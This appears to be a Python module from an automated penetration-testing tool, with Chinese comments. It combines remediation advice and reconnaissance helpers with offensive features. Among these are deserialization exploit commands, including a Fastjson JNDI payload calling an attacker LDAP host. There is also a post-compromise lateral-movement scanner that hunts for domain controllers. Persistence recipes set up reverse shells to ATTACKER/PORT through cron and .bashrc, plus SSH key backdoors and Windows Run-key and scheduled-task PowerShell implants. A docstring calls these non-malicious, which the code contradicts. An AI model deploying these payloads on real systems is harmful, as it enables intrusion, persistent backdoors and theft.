"""
V4 缺失补丁 H-4~H-13 合并模块.

H-4:  修复建议 (每个漏洞类型 → 修复方案)
H-5:  Wayback Machine (历史 URL 抓取)
H-6:  CMS 指纹自动触发
H-7:  反序列化 payload 生成
H-8:  横向移动 (内网探测)
H-9:  WHOIS 查询 (HackerTarget API)
H-10: ICP 备案查询 (国内站)
H-11: 截图 (Playwright 无头截图)
H-12: 持久化 payload 生成
H-13: 会话管理自动接入
"""

import asyncio
import re

# ============================================================
# H-4: 修复建议
# ============================================================

REMEDIATION_GUIDE = {
    "sqli": {
        "title": "SQL 注入",
        "fix": "使用参数化查询 (Prepared Statements), 禁止拼接 SQL.",
        "code_example": "# Python\ncursor.execute(\"SELECT * FROM users WHERE id = %s\", (user_id,))",
        "owasp": "A03:2021-Injection",
    },
    "xss": {
        "title": "跨站脚本 (XSS)",
        "fix": "对用户输入做 HTML 编码 (Output Encoding), 设置 Content-Security-Policy.",
        "code_example": "# Python\nimport html\nsafe = html.escape(user_input)",
        "owasp": "A03:2021-Injection",
    },
    "ssrf": {
        "title": "服务端请求伪造 (SSRF)",
        "fix": "白名单允许的域名/IP, 禁止访问 169.254.169.254/127.0.0.1/10.0.0.0/8.",
        "code_example": "# 白名单校验\nif not is_allowed_domain(url):\n    raise SecurityError",
        "owasp": "A10:2021-SSRF",
    },
    "lfi": {
        "title": "本地文件包含 (LFI)",
        "fix": "白名单允许的文件, 禁止路径穿越 (../), 用 realpath() 校验.",
        "code_example": "# PHP\n$real = realpath($input);\nif (!str_starts_with($real, $base_dir)) die('forbidden');",
        "owasp": "A01:2021-Broken Access Control",
    },
    "cmdi": {
        "title": "命令注入",
        "fix": "禁止拼接 shell 命令, 使用参数化的 API (subprocess.run(list)).",
        "code_example": "# Python\nsubprocess.run(['ls', user_input])  # 不用 shell=True",
        "owasp": "A03:2021-Injection",
    },
    "ssti": {
        "title": "服务端模板注入 (SSTI)",
        "fix": "使用沙箱模板引擎, 禁止用户输入直接进入模板渲染.",
        "code_example": "# Jinja2 沙箱\nfrom jinja2.sandbox import SandboxedEnvironment\nenv = SandboxedEnvironment()",
        "owasp": "A03:2021-Injection",
    },
    "idor": {
        "title": "越权访问 (IDOR)",
        "fix": "每次资源访问都校验当前用户是否有权访问该资源 ID.",
        "code_example": "# 校验所有权\nif resource.owner_id != current_user.id:\n    abort(403)",
        "owasp": "A01:2021-Broken Access Control",
    },
    "redis-unauth": {
        "title": "Redis 未授权访问",
        "fix": "bind 127.0.0.1 + requirepass + 禁用 CONFIG/FLUSHALL 命令.",
        "code_example": "# redis.conf\nbind 127.0.0.1\nrequirepass YourStrongPassword\nrename-command CONFIG \"\"",
        "owasp": "A05:2021-Security Misconfiguration",
    },
    "docker-unauth": {
        "title": "Docker daemon 未授权",
        "fix": "不要暴露 2375 端口. 用 TLS (2376) + 证书认证.",
        "code_example": "# dockerd 启动带 TLS\ndockerd --tlsverify --tlscacert=ca.pem ...",
        "owasp": "A05:2021-Security Misconfiguration",
    },
    "ssh-weak": {
        "title": "SSH 弱口令",
        "fix": "禁用密码登录, 只允许密钥认证. 强密码策略.",
        "code_example": "# /etc/ssh/sshd_config\nPasswordAuthentication no\nPubkeyAuthentication yes",
        "owasp": "A07:2021-Identification and Authentication Failures",
    },
    "jwt-none": {
        "title": "JWT alg=none",
        "fix": "强制验证签名, 禁止 alg=none. 白名单允许的算法.",
        "code_example": "# 强制 HS256\njwt.decode(token, key, algorithms=['HS256'])  # 不允许 none",
        "owasp": "A02:2021-Cryptographic Failures",
    },
    "file-upload": {
        "title": "文件上传漏洞",
        "fix": "白名单后缀 + 重命名文件 + 存储到非 Web 目录 + 禁止执行.",
        "code_example": "# Nginx\nlocation /uploads/ {\n    location ~ \\.(php|jsp|asp)$ { deny all; }\n}",
        "owasp": "A04:2021-Insecure Design",
    },
    "default": {
        "title": "安全加固",
        "fix": "参考 OWASP Top 10 进行修复. 最小权限原则 + 纵深防御.",
        "owasp": "A00:OWASP Top 10",
    },
}

def get_remediation(vuln_type: str) -> dict:
    """获取漏洞类型的修复建议"""
    key = vuln_type.lower().replace(" ", "-")
    return REMEDIATION_GUIDE.get(key, REMEDIATION_GUIDE["default"])


# ============================================================
# H-5: Wayback Machine
# ============================================================

async def wayback_urls(domain: str, limit: int = 100) -> list:
    """
    从 Wayback Machine 获取历史 URL.

    常发现已删除的敏感页面 (旧 API/admin/调试页面).
    """
    import requests

    def _fetch():
        try:
            r = requests.get(
                f"https://web.archive.org/cdx/search/cdx",
                params={
                    "url": f"{domain}/*",
                    "output": "json",
                    "fl": "original,timestamp,statuscode",
                    "collapse": "urlkey",
                    "limit": limit,
                },
                timeout=20,
            )
            if r.status_code == 200 and r.text.strip():
                data = r.json()
                if len(data) > 1:
                    # 跳过 header 行
                    return [{"url": row[0], "timestamp": row[1], "status": row[2]}
                            for row in data[1:]]
        except Exception:
            pass
        return []

    return await asyncio.to_thread(_fetch)


# ============================================================
# H-6: CMS 指纹自动检测 (简化版)
# ============================================================

CMS_SIGNATURES = {
    "wordpress": [
        (r'wp-content/', "WordPress"),
        (r'wp-includes/', "WordPress"),
        (r'name="generator"\s+content="WordPress', "WordPress"),
    ],
    "drupal": [
        (r'sites/all/themes/', "Drupal"),
        (r'name="generator"\s+content="Drupal', "Drupal"),
        (r'Drupal\.settings', "Drupal"),
    ],
    "joomla": [
        (r'/components/com_', "Joomla"),
        (r'name="generator"\s+content="Joomla', "Joomla"),
    ],
    "discuz": [
        (r'discuz_uid', "Discuz!"),
        (r'forum\.php\?mod=', "Discuz!"),
    ],
    "phpmyadmin": [
        (r'phpMyAdmin', "phpMyAdmin"),
    ],
    "gitlab": [
        (r'gitlab', "GitLab"),
    ],
    "jenkins": [
        (r'jenkins', "Jenkins"),
        (r'X-Jenkins', "Jenkins"),
    ],
    "thinkphp": [
        (r'ThinkPHP', "ThinkPHP"),
    ],
}

async def detect_cms(url: str, engine) -> dict:
    """检测 CMS 类型"""
    from .bridge import create_bridge_burp

    def _detect():
        burp = create_bridge_burp(engine, delay=0)
        r = burp.get(url)
        detected = []
        for cms, patterns in CMS_SIGNATURES.items():
            for pat, name in patterns:
                if re.search(pat, r.body, re.I) or re.search(pat, str(r.headers), re.I):
                    detected.append({"cms": name, "evidence": pat})
                    break
        return detected

    return await asyncio.to_thread(_detect)


# ============================================================
# H-7: 反序列化 payload 生成
# ============================================================

def generate_deserialization_payloads(target: str = "RCE") -> dict:
    """
    生成反序列化探测 payload.

    不含恶意代码 — 只用于检测反序列化是否触发.
    实际利用需要 ysoserial / ysoserial.net.
    """
    import base64

    return {
        "java_rmi": {
            "description": "Java RMI 反序列化",
            "payload_type": "Java serialized object",
            "tools": ["ysoserial", "ysoserial-modified"],
            "commands": [
                f"ysoserial exploit/JRMPListener {target} CommonsCollections1 'command'",
                f"ysoserial CommonsCollections5 'id' | base64",
            ],
            "detection": "发送序列化对象, 观察 DNS 回调或延迟",
        },
        "java_shiro": {
            "description": "Apache Shiro rememberMe 反序列化",
            "payload_type": "AES-CBC + Java serialized",
            "tools": ["ShiroExploit", "ysoserial"],
            "commands": [
                "python shiro_exploit.py -u <url> -t 1",
                "ysoserial CommonsBeanutils1 'command' → AES 加密 → Base64 → Cookie",
            ],
            "detection": "替换 rememberMe cookie, 观察服务端是否反序列化",
        },
        "fastjson": {
            "description": "Fastjson autotype 反序列化",
            "payload_type": "JSON @type",
            "tools": ["fastjson-vul-tools"],
            "commands": [
                '''{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER/exp","autoCommit":true}''',
            ],
            "detection": "发送 @type payload, 观察 LDAP/RMI 回调",
        },
        "python_pickle": {
            "description": "Python pickle 反序列化",
            "payload_type": "pickle serialized",
            "tools": ["pickle Payload Generator"],
            "commands": [
                "import pickle, os; pickle.dumps(os.system)",
                f"python -c \"import pickle,os;print(pickle.dumps(os.system))\" | base64",
            ],
        },
        "php_unserialize": {
            "description": "PHP unserialize() 反序列化",
            "payload_type": "PHP serialized string",
            "tools": ["PHPGGC"],
            "commands": [
                "phpggc Laravel/RCE1 'id' --base64",
                "phpggc Symfony/RCE4 'id'",
            ],
        },
    }


# ============================================================
# H-8: 横向移动 (内网探测)
# ============================================================

async def internal_recon(engine, pivot_ip: str,
                          scan_ports: list = None,
                          timeout: float = 3.0) -> dict:
    """
    拿到一台主机后的内网横向探测.

    通过已控主机 (pivot) 扫描内网:
        - 同网段存活主机
        - 内网开放的高危端口 (Redis/MySQL/Docker/SMB)
        - 域控检测 (445/389/88 端口)

    Args:
        engine:   TrafficEngine (通过 SSH 代理或直接内网)
        pivot_ip: 已控主机 IP
    """
    if scan_ports is None:
        scan_ports = [22, 80, 135, 139, 389, 443, 445, 88, 1433,
                      3306, 3389, 5985, 6379, 8080, 9200, 11211, 27017]

    # 推断 C 段
    from ipaddress import ip_network
    try:
        c_seg = str(ip_network(f"{pivot_ip}/24", strict=False))
    except ValueError:
        c_seg = f"{pivot_ip}/24"

    result = await engine.scan_cidr(
        c_seg, ports=scan_ports, concurrency=20,
        timeout=timeout, max_hosts=254,
    )

    # 分析内网发现
    findings = {
        "c_segment": c_seg,
        "total_hosts": result.hosts_scanned,
        "open_ports": result.open_count,
        "high_value": [],
        "domain_controllers": [],
    }

    for entry in result.open_entries():
        # 域控特征: 445+389+88 同时开放
        if entry.port in (445, 389, 88):
            findings["domain_controllers"].append(entry.target)

        # 高危服务
        if entry.is_high_value:
            findings["high_value"].append({
                "target": entry.target,
                "service": entry.service,
                "protocol": entry.protocol,
                "tags": entry.tags[:3],
            })

    return findings


# ============================================================
# H-9: WHOIS 查询 (不依赖 python-whois)
# ============================================================

async def whois_lookup(domain: str) -> dict:
    """
    WHOIS 查询 — 用 HackerTarget API (免费, 不需要 python-whois 库).

    返回注册人/邮箱/注册商/创建日期等信息.
    """
    import requests as _req

    def _lookup():
        try:
            r = _req.get(
                f"https://api.hackertarget.com/whois/?q={domain}",
                timeout=15,
            )
            if r.status_code == 200 and len(r.text) > 50:
                text = r.text
                result = {}
                # 提取关键字段
                for field, patterns in {
                    "registrar": [r'Registrar:\s*(.+)', r'Registrar Name:\s*(.+)'],
                    "email": [r'Registrant Email:\s*(\S+)', r'Email:\s*(\S+)'],
                    "org": [r'Registrant Organization:\s*(.+)', r'Org:\s*(.+)'],
                    "country": [r'Registrant Country:\s*(\S+)'],
                    "created": [r'Creation Date:\s*(.+)'],
                    "updated": [r'Updated Date:\s*(.+)'],
                    "name_servers": [r'Name Server:\s*(\S+)'],
                }.items():
                    for pat in patterns:
                        m = re.search(pat, text)
                        if m:
                            if field == "name_servers":
                                result.setdefault(field, []).append(m.group(1))
                            else:
                                result[field] = m.group(1).strip()
                            break
                result["raw"] = text[:500]
                return result
        except Exception:
            pass
        return {}

    return await asyncio.to_thread(_lookup)


# ============================================================
# H-10: ICP 备案查询 (国内站)
# ============================================================

async def icp_lookup(domain: str) -> dict:
    """
    ICP 备案查询 — 查询国内网站的备案信息.

    返回备案号/公司名/网站名/备案类型.
    使用公开 API (多个源 fallback).
    """
    import requests as _req

    def _lookup():
        # 源 1: 极速数据 (免费接口)
        sources = [
            {
                "url": f"https://api.vvhan.com/api/icp",
                "params": {"domain": domain},
                "parse": lambda d: {
                    "icp": d.get("icp", ""),
                    "company": d.get("unit", ""),
                    "site_name": d.get("name", ""),
                    "type": d.get("nature", ""),
                },
            },
        ]

        for src in sources:
            try:
                r = _req.get(src["url"], params=src.get("params"),
                            timeout=10, headers={"User-Agent": "Mozilla/5.0"})
                if r.status_code == 200:
                    try:
                        data = r.json()
                        parsed = src["parse"](data)
                        if parsed.get("icp") or parsed.get("company"):
                            return parsed
                    except Exception:
                        pass
            except Exception:
                continue

        return {"error": "备案信息查询失败 (可能是非国内域名或接口限流)"}

    return await asyncio.to_thread(_lookup)


# ============================================================
# H-11: 截图 (Playwright 无头截图)
# ============================================================

async def take_screenshot(url: str, output_path: str = "screenshot.png",
                          width: int = 1280, height: int = 720,
                          timeout: float = 30.0) -> dict:
    """
    网页截图 — 用于漏洞 PoC 留证.

    需要 Playwright (pip install playwright && playwright install chromium).
    失败时返回错误, 不崩.
    """
    try:
        from playwright.async_api import async_playwright
    except ImportError:
        return {"ok": False, "error": "playwright not installed (pip install playwright)"}

    try:
        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            page = await browser.new_page(viewport={"width": width, "height": height})
            await page.goto(url, timeout=timeout * 1000, wait_until="networkidle")
            await page.screenshot(path=output_path, full_page=False)
            await browser.close()

        import os
        size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
        return {"ok": True, "path": output_path, "size": size}
    except Exception as e:
        return {"ok": False, "error": str(e)[:100]}


# ============================================================
# H-12: 持久化建议 + payload 生成
# ============================================================

def persistence_payloads(target_os: str = "linux") -> dict:
    """
    生成持久化建议 (拿到 shell 后的驻留方式).

    注意: 只生成技术参考, 不含恶意 payload.
    每种方法标注: 原理/命令/检测方式/清除方式.
    """
    payloads = {
        "linux": [
            {
                "method": "Cron 计划任务",
                "command": "# 反弹 shell 每分钟执行\n(crontab -l; echo '* * * * * /bin/bash -c \"bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\"') | crontab -",
                "detect": "crontab -l",
                "cleanup": "crontab -r",
            },
            {
                "method": "SSH 公钥写入",
                "command": "# 写入攻击者公钥\necho 'ssh-rsa AAAA...' >> ~/.ssh/authorized_keys",
                "detect": "cat ~/.ssh/authorized_keys",
                "cleanup": "删除非自己的 key",
            },
            {
                "method": "Systemd Service",
                "command": "# 创建后门服务\n# /etc/systemd/system/update-service.service",
                "detect": "systemctl list-units --type=service",
                "cleanup": "systemctl stop && disable && rm",
            },
            {
                "method": "Bash Profile 注入",
                "command": 'echo \'bash -i >& /dev/tcp/ATTACKER/PORT 0>&1\' >> ~/.bashrc',
                "detect": "cat ~/.bashrc ~/.bash_profile",
                "cleanup": "删除注入行",
            },
        ],
        "windows": [
            {
                "method": "计划任务",
                "command": "schtasks /create /tn \"Update\" /tr \"cmd /c powershell -e <base64>\" /sc minute /mo 1",
                "detect": "schtasks /query",
                "cleanup": "schtasks /delete /tn \"Update\" /f",
            },
            {
                "method": "注册表启动项",
                "command": 'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v Update /t REG_SZ /d "powershell -e <base64>"',
                "detect": "reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                "cleanup": "reg delete ... /v Update /f",
            },
            {
                "method": "WMI 事件订阅",
                "command": "# 永久 WMI 事件订阅 (无文件后门)",
                "detect": "wmic /namespace:\\\\root\\subscription path __EventConsumer get",
                "cleanup": "删除 WMI 事件订阅",
            },
        ],
    }

    return payloads.get(target_os, payloads["linux"])


# ============================================================
# H-13: 会话管理自动接入
# ============================================================

def create_session_manager():
    """
    创建会话管理器 — 自动管理多账户 cookie/token.

    用于越权测试:
        1. 保存账户 A 的 session
        2. 保存账户 B 的 session
        3. 用 A 的 session 访问 B 的资源 → 检测越权

    返回 V3 的 AuthManager.
    """
    from ..core.auth_manager import AuthManager
    return AuthManager()


def save_session_from_response(auth_manager, account_name: str,
                                response_headers: dict,
                                role: str = "user"):
    """
    从 HTTP 响应头里提取 session/cookie 并保存.

    用于自动化: Agent 登录后自动保存 session.
    """
    from ..core.auth_manager import Account

    cookies = {}
    set_cookie = response_headers.get("set-cookie", "")
    if set_cookie:
        # 解析 Set-Cookie
        for part in set_cookie.split(";"):
            if "=" in part:
                k, _, v = part.strip().partition("=")
                if k.lower() not in ("path", "domain", "expires", "max-age",
                                     "secure", "httponly", "samesite"):
                    cookies[k] = v

    # 检查 Authorization 头
    headers = {}
    auth = response_headers.get("authorization", "")
    if auth:
        headers["Authorization"] = auth

    account = Account(
        name=account_name,
        cookies=cookies,
        headers=headers,
        role=role,
    )
    auth_manager.add_account_from_object(account_name, account)
    return account


# ============================================================
# 漏洞修复建议增强 (H-4 扩展)
# ============================================================

# 新增的修复建议
EXTRA_REMEDIATIONS = {
    "file-upload": {
        "title": "文件上传漏洞",
        "fix": "白名单后缀 + 重命名文件 + 存储到非 Web 目录 + 禁止执行.",
        "code_example": "# Nginx\nlocation /uploads/ {\n    location ~ \\.(php|jsp|asp)$ { deny all; }\n}",
        "owasp": "A04:2021-Insecure Design",
    },
    "ssrf": {
        "title": "SSRF (服务端请求伪造)",
        "fix": "白名单允许的域名/IP, 禁止访问 169.254.169.254/内网段.",
        "code_example": "# 白名单校验\nif not is_allowed_domain(url):\n    raise SecurityError",
        "owasp": "A10:2021-SSRF",
    },
    "rce": {
        "title": "远程代码执行 (RCE)",
        "fix": "禁止用户输入进入命令/代码执行, 使用参数化 API.",
        "owasp": "A03:2021-Injection",
    },
    "info-leak": {
        "title": "信息泄露",
        "fix": "关闭调试模式, 关闭目录列表, 删除备份文件, 禁用 server header.",
        "owasp": "A05:2021-Security Misconfiguration",
    },
    "broken-auth": {
        "title": "认证失效",
        "fix": "强制密码策略 + 限制登录尝试 + MFA + Session 超时.",
        "owasp": "A07:2021-Identification and Authentication Failures",
    },
}

# 合并到主修复指南
REMEDIATION_GUIDE.update(EXTRA_REMEDIATIONS)
